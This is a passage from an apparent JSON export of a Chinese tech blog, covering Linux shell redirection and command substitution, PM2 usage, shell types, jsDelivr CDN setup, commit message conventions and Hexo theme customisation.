标准输出信息[max@localhost 桌面]$ cat xxxcat: xxx: 没有那个文件或目录 # 错误输出信息 因为不存在xxx文件 标准输入重定向（STDIN，文件描述符为0）：默认从键盘输入，也可从其他文件或命令中输入。 标准输出重定向（STDOUT，文件描述符为1）：默认输出到屏幕。 错误输出重定向（STDERR，文件描述符为2）：默认输出到屏幕。 之所以花这么大力气，理解这个概念，是因为待会有个很重要的知识点要用到这个概念。 输出重定向123456命令 &gt; 文件 将标准输出重定向到一个文件中（清空原有文件的数据）命令 2&gt; 文件 将错误输出重定向到一个文件中（清空原有文件的数据）命令 &gt;&gt; 文件 将标准输出重定向到一个文件中（追加到原有内容的后面）命令 2&gt;&gt; 文件 将错误输出重定向到一个文件中（追加到原有内容的后面）命令 &gt;&gt; 文件 2&gt;&amp;1 或命令 &amp;&gt;&gt; 文件 将标准输出与错误输出共同写入到文件中（追加到原有内容的后面） 实例： 12345678910[max@localhost 桌面]$ cat test.txtHello Linux![max@localhost 桌面]$ echo &quot;测试输出重定向(追加模式)&quot; &gt;&gt; test.txt[max@localhost 桌面]$ cat test.txt Hello Linux!测试输出重定向(追加模式)[max@localhost 桌面]$ echo &quot;测试输出重定向(清除模式)&quot; &gt; test.txt[max@localhost 桌面]$ cat test.txt测试输出重定向(清除模式) 输入重定向123命令 &lt; 文件 将文件作为命令的标准输入命令 &lt;&lt; 分界符 从标准输入中读入，直到遇见分界符才停止命令 &lt; 文件1 &gt; 文件2 将文件1作为命令的标准输入并将标准输出到文件2 输入重定向相对于输出重定向较使用的少一些，可以理解为：输入重定向的作用是把文件直接导入到命令中。例子： 123# 将文件text.txt导入给 &#96;wc -l&#96;命令，统计行数。[max@localhost 桌面]$ wc -l &lt; test.txt1 管道符管道符的概念就是：把前一个命令原本要输出到屏幕的标准正常数据当作是后一个命令的标准输入。 举个例子，把etc目录下的所有文件的属性信息，作为标准输入传递给 more命令。 12345678[max@localhost 桌面]$ ls -l &#x2F;etc&#x2F; | more总用量 1396drwxr-xr-x. 3 root root 97 8月 24 04:35 abrt-rw-r--r--. 1 root root 16 8月 24 04:43 adjtime-rw-r--r--. 1 root root 21929 1月 29 2014 brltty.confdrwxr-xr-x. 2 root root 6 1月 29 2014 chkconfig.d-rw-r--r--. 1 root root 1157 2月 6 2014 chrony.conf--More-- 命令行中的通配符 星号（*）代表匹配零个或多个字符 问号（?）代表匹配单个字符 中括号内加上数字[0-9]代表匹配0～9之间的单个数字的字符 而中括号内加上字母[abc]则是代表匹配a、b、c三个字符中的任意一个字符123456789101112131415161718[max@localhost test]$ lsfile1 file2 file3 file99 filex[max@localhost test]$ ls -l file?-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2-rw-rw-r--. 1 max max 0 10月 10 22:49 file3-rw-rw-r--. 1 max max 0 10月 10 22:49 filex[max@localhost test]$ ls -l file*-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2-rw-rw-r--. 1 max max 0 10月 10 22:49 file3-rw-rw-r--. 1 max max 0 10月 10 22:49 file99-rw-rw-r--. 1 max max 0 10月 10 22:49 filex[max@localhost test]$ ls -l file[1-2]-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2[max@localhost test]$ ls -l file[x]-rw-rw-r--. 1 max max 0 10月 10 22:49 filex 常用的转义字符 反斜杠（\\）：使反斜杠后面的一个变量变为单纯的字符串。 单引号（’’）：转义其中所有的变量为单纯的字符串。 双引号（””）：保留其中的变量属性，不进行转义处理。 反引号（``）：把其中的命令执行后返回结果。 123[max@localhost test]$ PRICE&#x3D;5[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;The price of this shirt is 5 上面的输出看上去挺对的，但是并不完美，我们希望能够输出“The price of this shirt is $5”，于是我们试着这样写： 12[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;The price of this shirt is 9944PRICE 不幸的是美元符号和变量提取符号合并后$$作用是显示当前程序的进程ID。 要想让第一个$乖乖地作为美元符号，那么就需要使用反斜杠\\来进行转义，将这个命令提取符转义成单纯的文本，去除其特殊功能。 12[max@localhost test]$ echo &quot;The price of this shirt is \\$$PRICE&quot;The price of this shirt is $5 如果只需要某个命令的输出值时，可以像命令这样，将命令用反引号括起来，达到预期的效果. 123[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1[max@localhost test]$ cat file1Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux 思考：如何将普通变量转换为全局变量？ 使用命令：export [变量名称]，需要在拥有管理员权限时才能正常使用。 12345678910111213141516[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir[root@localhost home]# mkdir $WORKDIR [root@localhost home]# cd $WORKDIR[root@localhost workdir]# pwd&#x2F;home&#x2F;workdir[root@localhost workdir]# exitexit[max@localhost home]$ cd $WORKDIR[max@localhost ~]$ echo $WORKDIR[max@localhost ~]$ su root密码：[root@localhost max]# export WORKDIR[root@localhost &#x2F;]# su max[max@localhost &#x2F;]$ cd $WORKDIR[max@localhost workdir]$ pwd&#x2F;home&#x2F;workdir 重点一：在上面的命令中有一个很重要的知识点： 关于如何在Linux中创建一个变量的问题？有两个地方需要注意。 所有字母都需要大写 变量与赋值符号(=)之间不能存在空格 无论是系统环境变量还是自定义变量还是全局变量，在调用时 都需要使用$符号来标识。 重点二 在Linux 系统中当普通用户身份时命令提示符的前缀标识是：$。 在Linux 系统中当为管理员身份时命令提示符的前缀标识是：#。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"PM2 快速上手","slug":"pm2-quick-start","date":"2020-07-12T13:44:47.000Z","updated":"2020-07-30T12:40:58.248Z","comments":true,"path":"pm2-quick-start/","link":"","permalink":"https://www.0x2beace.com/pm2-quick-start/","excerpt":"PM2 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。","text":"PM2 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。 安装 1$ npm install pm2 -g 无缝更新 1$ pm2 update 启动应用PM2 中有两种方式启动应用，一种是直接调用应用入口文件，一种是通过调用配置文件启动应用。 命令行启动在生产环境中，通过命令行启动服务 1$ pm2 stat app.js 配置文件启动很多时候，仅仅只是使用 PM2 去启动应用，可能不能完全满足我们的需求。 当需要对应用有更多的要求时，这个时候就需要用到PM2 的配置文件了。 PM2 支持通过配置文件创建管理应用，首先在项目根目录手动创建配置文件precesses.json： 12345678910&#123; &quot;apps&quot;: [ &#123; &quot;name&quot;: &quot;myApp&quot;, &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;, &quot;script&quot;: &quot;.&#x2F;app.js&quot;, &quot;watch&quot;: true &#125; ]&#125; 或者直接使用 pm2 init 命令，自动创建默认的ecosystem.config.js配置文件： 1234567module.exports &#x3D; &#123; apps : [&#123; name: &quot;myApp&quot;, script: &#39;index.js&#39;, watch: &#39;.&#39; &#125;&#125;; 这两种方式都可以创建管理应用，作用都是一样的，区别只是：一个是json格式的配置文件，一个是js格式的配置文件。 上面是一个最简单的processes.json配置，创建了一个myApp应用，如果你有多个服务，那么apps 这个数组中创建多个应用。 创建好配置文件之后，那么该如何启动呢？ 有两种方式： 直接调用配置文件启动 1$ pm2 start processes.json 可以增加--env参数，来指定当前启动环境。 通过package.json 配置文件，配置脚本启动 123456&#x2F;&#x2F; package.json&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;node server&#x2F;index&quot;, &quot;pm2&quot;: &quot;pm2 start processes.json&quot; &#125; 然后就可以直接使用npm start pm2 来启动应用了。 参数说明在配置文件你可以指定环境变量、日志文件、进程文件，重启最大次数…等配置项。支持JSON和YAML格式。 PM2 的配置支持非常多的参数，下面会对常用的参数一一做说明。 字段 类型 值 描述 name string myApp 应用的名字，默认是脚本文件名 cwd string /var/www/myApp 应用程序所在目录 script string ./server.js 应用程序的脚本路径，相对于应用程序所在目录 log_date_format string YYYY-MM-DD HH:mm Z 日志时间格式 error_file string - 错误日志存放路径 out_file string - 输出日志存放路径 pid_file string - pid文件路径 watch boolean or array true 当目录文件或子目录文件有变化时自动重新加载应用 ignore_watch list [”[/]./”, “node_modules”] list中的正则匹配的文件和目录有变化时不重新加载应用 max_memory_restart string 50M 当应用超过设定的内存大小就自动重启 min_uptime string 60s 最小运行时间，这里设置的是60s即如果应用程序在60s内退出，pm2会认为程序异常退出，此时触发重启max_restarts设置数量 max_restarts number 10 设置应用程序异常退出重启的次数，默认15次（从0开始计数） instances number 1 启动实例个数 cron_restart string 1 0 * * * 定时重启 exec_interpreter string node 应用程序的脚本类型，默认是node exec_mode string fork 应用启动模式，支持fork和cluster模式，默认为fork autorestart boolean true 应用程序崩溃或退出时自动重启 有以下几点需要注意 ⚠️： 如果processes.json或者ecosystem.config.js 配置文件如果发生了变化，建议直接删除应用之后，重新创建，否则可能部分配置不会生效。 cwd 不要填绝对路径，建议用相对路径，./表示相对于配置文件根目录，否则可能会出现静态资源丢失的情况。 进程监控列出所有节点应用程序（进程/微服务） 12$ pm2 list$ pm2 ls 可以将进程列表以JSON格式打印出来： 12$ pm2 jlist$ pm2 prettylist 使用进程ID或名称查看所示的单个Node进程的详细信息： 12$ pm2 describe &lt;id | app_name&gt;$ pm2 show &lt;id | app_name&gt; 实时监控所有进程CPU或内存使用情况： 1$ pm2 monit 日志管理查看某个应用的日志： 1$ pm2 logs [&#39;all&#39; | app_name | app_id ] 1234$ pm2 logs --json # JSON 格式输出$ pm2 logs --format # 格式化 output$ pm2 flush # 清空所有日志文件$ pm2 reloadLogs # 重新加载所有日志文件 常用命令停止进程 1$ pm2 stop [&#39;all&#39; | app_name | app_id ] 重启进程 1$ pm2 restart [&#39;all&#39; | app_name | app_id ] 0秒停机重载进程 (用于 NETWORKED 进程) 1$ pm2 reload all 杀死进程 1$ pm2 delete [&#39;all&#39; | app_name | app_id ] 使用PM2 运行 npm startnpm run xxxx 是 node常用的启动方式之一，那么如何使用PM2来实现对该方式的启动呢？ npm run、npm start等命令之所以可以使用，是因为package.json配置文件中增加了对应的脚本命令。 1234&quot;scripts&quot;: &#123; &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;, &quot;start&quot;: &quot;node server&#x2F;index&quot;, &#125; 语法： 1pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;; 其中 --watch监听代码变化，--name重命名任务名称，-- run后面跟脚本名字 实例： 12&#x2F;&#x2F; 等效于 npm startpm2 start npm --watch --name webserver -- run start 稳定运行PM2 是一款非常优秀的 Node 进程管理工具，它有着丰富的特性，能够充分利用多核CPU且能够负载均衡、能够帮助应用在崩溃后、指定时间(cluster model)和超出最大内存限制等情况下实现自动重启。 为了保证能够稳定运行，可以参考以下几点建议： 应用进程运行时间久了或许总会产生一些意料之外的问题，定时重启可以规避一些不可测的情况； 最大内存限制，根据观察设定合理内存限制，保证应用异常运行； min_uptime，min_uptime 是应用正常启动的最小持续运行时长，合理设置设置此范围，可以将超出时间判定为异常启动； 设定异常重启延时restart_delay，对于异常情况导致应用停止，设定异常重启延迟可防止应用在不可测情况下不断重启的导致重启次数过多等问题； 设置异常重启次数，如果应用不断异常重启，并超过一定的限制次数，说明此时的环境长时间处于不可控状态，服务器异常。此时便可停止尝试，发出错误警告通知等。 参考链接 pm2 从入门到精通 如何在生产服务器上安装PM2运行Node.js应用程序 PM2 配置文件说明解析 PM2 应用配置文件解析 PM2 实用手册 PM2 用法详解 使用pm2 自动部署node项目 PM2 中文文档","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}]},{"title":"Linux 中的eval、反引号、$()的区别","slug":"the-difference-between-eval-and-backquotes-in-linux-and","date":"2020-07-11T12:41:10.000Z","updated":"2020-07-11T12:46:46.350Z","comments":true,"path":"the-difference-between-eval-and-backquotes-in-linux-and/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/","excerpt":"之前在搭建 SSH 环境时，遇到了这样一个问题： 使用命令：eval$(ssh-agent)去创建一个代理进程，但是会提示：No Such file or directory 。 就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？ 后来，了解到原来一直使用的 eval$(ssh-agent) ，其中的$() 原来在Linux中有特殊的意义。 所以这篇笔记专门用来了解 eval 和 反引号 以及 $()之间的区别。 它们的作用都是命令替换。","text":"之前在搭建 SSH 环境时，遇到了这样一个问题： 使用命令：eval$(ssh-agent)去创建一个代理进程，但是会提示：No Such file or directory 。 就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？ 后来，了解到原来一直使用的 eval$(ssh-agent) ，其中的$() 原来在Linux中有特殊的意义。 所以这篇笔记专门用来了解 eval 和 反引号 以及 $()之间的区别。 它们的作用都是命令替换。 场景重现12345678910$ &#96;ssh-agent&#96;sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory$ eval ssh-agentSSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;echo Agent pid 1092;$ eval &#96;ssh-agent&#96;Agent pid 4288 直到我输入 eval ssh-agent 时，似乎就对了。 命令代换这三种不同的方式都是shell脚本中的命令代换。 命令代换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。 eval首先要介绍的是: eval 它的作用是：重新运算求出参数的内容。 该命令使用于那些一次扫描无法实现其功能的变量。该命令对变量进行两次扫描。 1234567891011$ touch test.txt$ vim test.txt &#x2F;&#x2F; 写入 Hello eval$ var&#x3D;&quot;cat test.txt&quot;&#x2F;&#x2F; 注意：中间没有空格，前面没有美元符号。$ echo $varcat test.txt$ eval $varHello eval 反引号与 $()实例一： 12345678910$ DATE1&#x3D;$(date)$ DATE2&#x3D;&#96;date&#96;$ DATE3&#x3D;&#96;eval date&#96;$ echo $DATE12019年01月23日 21:20:36$ echo $DATE22019年01月23日 21:20:36$ echo $DATE32019年01月23日 21:20:36 实例二： 1234$ echo &#96;echo &#39;\\\\&#39;&#96; \\$ echo $(echo &#39;\\\\&#39;)\\\\ 暂时没太明白这三者的实际应用场景，不过了解到了 它们之间的一些区别与联系。 参考链接： https://kyle.io/2012/09/ssh-agent-messiness-solving-it/ shell脚本中命令代换：反引号、$()、eval区别 shell脚本中命令代换：反引号、$()、eval区别2","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"Linux 中的Shell 种类","slug":"shell-types-in-linux","date":"2020-07-11T12:36:46.000Z","updated":"2020-07-11T12:41:49.331Z","comments":true,"path":"shell-types-in-linux/","link":"","permalink":"https://www.0x2beace.com/shell-types-in-linux/","excerpt":"什么是Shell？","text":"什么是Shell？ Shell 是一个程序，其作用是将用户输入的命令发送到OS（系统内核）。 据说它起源于作为存在于OS 内部和用户之间的外壳的依附着。所以为形象的称作为 壳（Shell）。 Shell 的种类Linux Shell 的种类很多，目前流行的Shell 包括ash、bash、ksh、csh、zsh等，种类多了，也就有了标准化的要求，这就是POSIX的由来。 POSIX 表示可移植操作系统接口（UNIX的可移植操作系统接口，缩写为POSIX），POSIX标准定义了操作系统应该为应用程序提供的接口标准。 通过以下命令来查看文件中的内容来查看自己主机中当前有哪些种类的Shell： 1234567891011121314151617$ cat &#x2F;etc&#x2F;shells&#x2F;bin&#x2F;sh&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;ksh&#x2F;bin&#x2F;pdksh&#x2F;bin&#x2F;tcsh&#x2F;bin&#x2F;zsh&#x2F;bin&#x2F;dash&#x2F;bin&#x2F;posh&#x2F;usr&#x2F;bin&#x2F;sh&#x2F;usr&#x2F;bin&#x2F;bash&#x2F;usr&#x2F;bin&#x2F;ksh&#x2F;usr&#x2F;bin&#x2F;pdksh&#x2F;usr&#x2F;bin&#x2F;tcsh&#x2F;usr&#x2F;bin&#x2F;zsh&#x2F;usr&#x2F;bin&#x2F;dash&#x2F;usr&#x2F;bin&#x2F;posh 如何查看当前正在使用的Shell 类型： 12$ echo $SHELL&#x2F;bin&#x2F;bash $SHELL是一个环境变量，它记录了Linux 当前用户所使用的Shell类型。 用户可以通过直接输入各种Shell的二进制文件名（因为这些二进制文件本身是可以被执行的），来进入到该Shell下，比如进入zsh可以直接输入： 1$ &#x2F;bin&#x2F;zsh 这个命令为用户又启动了一个Shell，这个Shell在最初登录的那个Shell之后，称为下级的Shell或子Shell。 最标准的ShellBashsh是Unix 上最古老的Shell，在sh的基础上添加了各种扩展功能的是bash，它成为Linux标准Shell。有如下的特点： 使用上下键快速查看历史命令 Tab 键自动补全 其他Shellashash是Linux 中占用系统资源最少的一个小Shell，它只包含24个内部命令，因而使用起来很不方便。 cshcsh是Linux 比较大的内核，共有52个内部命令。该Shell其实是指向/bin/tcsh这样的一个Shell，也就是说，csh其实就是tcsh。 zshzch是Linux 最大的Shell之一，共有84 个内部命令。 zsh具有如下特性： 更好的自动补全、更高效 更好的文件名展开（通配符展开） 可定制性高 参考链接 什么是Shell以及常见Shell种类","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"免费 CDN：JsDelivr + Github","slug":"free-cdn-jsdelivr-github","date":"2020-07-10T05:32:43.000Z","updated":"2020-07-10T05:34:57.891Z","comments":true,"path":"free-cdn-jsdelivr-github/","link":"","permalink":"https://www.0x2beace.com/free-cdn-jsdelivr-github/","excerpt":"不知道大家通常是如何访问图床的，我之前一直使用的方式是：GitHub 图床 + raw.githubusercontent。 图片相关的资源全部放在GitHub上，然后使用GitHub 提供的素材服务器raw.githubusercontent去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。 因此需要使用 CDN 来加速来优化资源加载速度。","text":"不知道大家通常是如何访问图床的，我之前一直使用的方式是：GitHub 图床 + raw.githubusercontent。 图片相关的资源全部放在GitHub上，然后使用GitHub 提供的素材服务器raw.githubusercontent去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。 因此需要使用 CDN 来加速来优化资源加载速度。 CDN 是什么 CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科 由于某些原因，很多公用免费的 CDN 资源在中国大陆并不很好用，就算是付费的，也有一定的限制，例如每天的刷新次数有限之类的。幸运的是在中国大陆唯一有 license 的公有 CDN竟然是免费的，它就是——JsDelivr。 JsDelivr 是什么 A free CDN for Open Source fast, reliable, and automated. —— JsDelivr 官网 根据官网的介绍我们可以知道它是一个免费、快速、可靠、自动化 的CDN。 那么，这么棒的CDN，到底该如何使用呢？下面会一一介绍。 快速上手JsDelivr 目前有三种用法： \u001fNpm Github Wordpress 因为本文的重点是如何使用 GitHub + JsDelivr，来搭建免费的CDN，所以这里就不对其他两种用法做过多介绍。 1. 新建Github 仓库这个仓库是用于存储资源文件的，最好是public，因为private的仓库，资源链接会带token验证，而这个token会存在过期的问题。 2. 将本地资源推送至仓库将资源文件加入本地仓库，然后推送至 CDN 的远程仓库。 3. 发布仓库如果没有发布就直接使用，可能会导致文件加载异常。 自定义发布版本号： 然后点击Publish release。 4. 通过jsDeliver引用资源只需要通过符合 JSDelivr 规则的 URL 引用，即可直接使用 Github 中的资源。 规则如下： 1https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file 参数说明： cdn.jsdelivr.net/gh/：jsDeliver 规定Github 的引用地址 username：你的GitHub 用户名 repository：CDN 仓库 @version：发布的版本号 file：资源文件在仓库中的路径 版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下： 123456789101112131415&#x2F;&#x2F; 通过指定版本号引用https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg&#x2F;&#x2F; 使用一个范围内的版本https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; 忽略版本号则默认使用最新版https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js&#x2F;&#x2F; 在任意JS&#x2F;CSS文件后添加 .min 能得到一个缩小版&#x2F;&#x2F; 如果它本身不存在，我们将会为你生成https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js&#x2F;&#x2F; 在末尾加 &#x2F; 则得到目录列表https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F; 同样的一张图片，可以对比一下jsDeliver和raw.githubusercontent 的访问速度。 jsDeliver：https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg raw.githubusercontent：https://raw.githubusercontent.com/0xAiKang/CDN/master/blog/images/avatar.jpg","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"GitHub","slug":"Tutorial/GitHub","permalink":"https://www.0x2beace.com/categories/Tutorial/GitHub/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"如何写好Commit log","slug":"how-to-write-a-commit-log","date":"2020-07-10T01:22:51.000Z","updated":"2020-07-10T01:23:51.811Z","comments":true,"path":"how-to-write-a-commit-log/","link":"","permalink":"https://www.0x2beace.com/how-to-write-a-commit-log/","excerpt":"其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。 这里就不过多介绍什么是Git了，本文的重点是Commit Log，如果还不清楚Git是什么，可以看一下我的Git系列的其他笔记。","text":"其实关于这个问题，老早都想整理了，只是一直没有腾出空来。最近刚好有空，索性整理了下。 这里就不过多介绍什么是Git了，本文的重点是Commit Log，如果还不清楚Git是什么，可以看一下我的Git系列的其他笔记。 为什么要关注提交信息 加快Reviewing Code的过程 提醒自己或他人，某个提交具体增加了什么功能，改动了哪些地方 提高项目的整体质量 Angular 规范的 Commit message 格式这种格式（规范）是我目前觉得相对其他格式（规范）而言，最容易接受、上手的一种。 其核心是每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。 12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&#x2F;&#x2F; 空一行&lt;body&gt;&#x2F;&#x2F; 空一行&lt;footer&gt; 其中，Header 是必需的，Body 和 Footer 可以省略。 HeaderHeader 部分只有一行，包括三个字段：type（必需）、scope（可选）和 subject（必需）。 type 用于说明 commit 的类别，只允许使用下面 7 个标识。 feat 新功能（feature） fix 修补 bug docs 文档（documentation） style 格式（不影响代码运行的变动） refactor 重构（即不是新增功能，也不是修改 bug 的代码变动） test 增加测试 chore 构建过程、辅助工具的变动 perf 提高性能 typo 打字错误 scope 用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。 subject 是 commit 目的的简短描述，不超过 50 个字符。 BodyBody 部分是对本次 commit 的详细描述，可以分成多行。 FooterFooter 部分只用于不兼容变动和关闭 Issue。 总结本来我自己一直使用的方式就是：git commit -am &quot;fix login bug，虽然并没有绝对的对错，但这显然不是最好的方式。 这种东西并没有强制性的规定，只要团队之间约定好，然后按照这个约定协作就好了。 所以我觉得在团队之间commit时，可以不用完全按照Angular 规范的Commit message格式去提交，可以按照以下约定来执行。 commit时，只用保留 Header 部分就好。 pull request时，才需要 Header、Body、Footer 这三部分。 另外commit时需要注意以下几点： 创建短小而明确的commit，一句话说清楚。 一个小改动对应一次commit，不建议一大堆改动，一次commit。 如果添加的代码会使项目发生极大的变化，那么需要及时更新remade文件以向他人说明此次更改。 最佳实践123docs: add FAQ in readme filefeat: increase user login functionfix: fix user login bug 参考链接 Git 如何写好 Commit Log？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"Hexo Volantis 主题优化 | 增加分析与统计","slug":"hexo-volantis-theme-optimization-add-analysis-and-statistics","date":"2020-07-09T13:14:37.000Z","updated":"2020-07-09T13:19:08.344Z","comments":true,"path":"hexo-volantis-theme-optimization-add-analysis-and-statistics/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-analysis-and-statistics/","excerpt":"Volantis 默认支持 不蒜子 的访问统计，可以自行添加百度统计和 Google Analytics。","text":"Volantis 默认支持 不蒜子 的访问统计，可以自行添加百度统计和 Google Analytics。 环境要求 Hexo：4.2 Node：12 Volantis：2.6 分析与统计字数和阅读时长 Volantis 默认没有安装 wordcount插件，所以需要手动安装： 1npm i --save hexo-wordcount 修改主题配置文件themes/volantis/_config.yml，将 wordcount 插件打开 12345plugins: ... # 文章字数统计、阅读时长，开启需要安装插件: npm i --save hexo-wordcount wordcount: true 继续修改主题配置文件themes/volantis/_config.yml，将 wordcount 放在需要显示的 meta 位置： 12345678# 布局layout: on_list: meta: [..., wordcount, ...] on_page: meta: header: [..., wordcount, ...] footer: [..., wordcount, ...] 百度统计百度统计是百度推出的一款免费的专业网站流量分析工具，能够告诉用户访客是如何找到并浏览用户的网站，在网站上做了些什么，非常有趣，接下来我们把百度统计添加到自己博客当中。 访问百度统计首页，注册一个账号后登陆，添加你的博客网站。 点击获取代码，复制该代码。 在主题配置文件中，增加以下内容： 1cnzz: true 用于设置是否开启百度统计。 在themes/volantis/layout/_partial目录下，新建一个cnzz.ejs文件，将刚才复制的内容粘贴进去： 1234567891011&lt;% if (theme.cnzz)&#123; %&gt;&lt;script&gt; var _hmt &#x3D; _hmt || []; (function () &#123; var hm &#x3D; document.createElement(&quot;script&quot;); hm.src &#x3D; &quot;https:&#x2F;&#x2F;hm.baidu.com&#x2F;hm.js?xxxxxxxxxxxxxxxxxxxxxxx&quot;; var s &#x3D; document.getElementsByTagName(&quot;script&quot;)[0]; s.parentNode.insertBefore(hm, s); &#125;)();&lt;&#x2F;script&gt;&lt;% &#125; %&gt; 最后将以下内容放在网站首页的尾部themes/volantis/layout/_partial/footer.ejs中： 1&lt;%- partial(&#39;cnzz&#39;) %&gt; 完成以上所有操作之后，可以在百度统计管理页面检查代码是否安装正确，如果正确安装，通常二十分钟之后就可以看到网站的分析数据了。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.0x2beace.com/tags/Hexo/"}]},{"title":"Hexo Volantis 主题优化 | 添加日历图","slug":"hexo-volantis-theme-optimization-add-calendar","date":"2020-07-09T13:07:08.000Z","updated":"2020-07-09T13:12:15.183Z","comments":true,"path":"hexo-volantis-theme-optimization-add-calendar/","link":"","permalink":"https://www.0x2beace.com/hexo-volantis-theme-optimization-add-calendar/","excerpt":"一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。 默认效果如下： 因为我使用的Hexo 主题是Volantis、而该主题目前并没有集成该控件，所以需要手动配置。","text":"一直觉得GitHub 日历图（代码提交统计样式）很好看，偶然发现是可以通过配置将日历模块引入到Hexo 的主题中的。 默认效果如下： 因为我使用的Hexo 主题是Volantis、而该主题目前并没有集成该控件，所以需要手动配置。 